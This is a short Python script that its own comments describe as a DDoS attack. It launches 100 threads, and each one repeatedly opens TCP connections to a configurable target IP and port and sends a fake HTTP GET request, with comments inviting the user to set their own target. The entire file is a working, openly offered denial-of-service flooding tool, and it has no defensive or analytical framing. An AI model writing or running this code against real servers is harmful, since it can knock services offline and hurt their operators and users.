
# Copyright (C) PhcNguyen Developers
# Distributed under the terms of the Modified BSD License.

import socket
import threading

# Target server details
TARGET_IP = "192.168.1.2"  # Change to your server IP
TARGET_PORT = 7272          # Change to your server port
FAKE_MESSAGE = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(TARGET_IP)

# Function to send data in a loop
def attack():
    while True:
        try:
            # Create a new socket for each connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((TARGET_IP, TARGET_PORT))
            client_socket.sendall(FAKE_MESSAGE.encode())
            client_socket.close()
        except Exception as e:
            print(f"Error: {e}")
            break

# Start multiple threads to simulate multiple clients
def start_attack(threads=100):
    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

# Start the DDoS attack with 100 threads
if __name__ == "__main__":
    start_attack(threads=100)
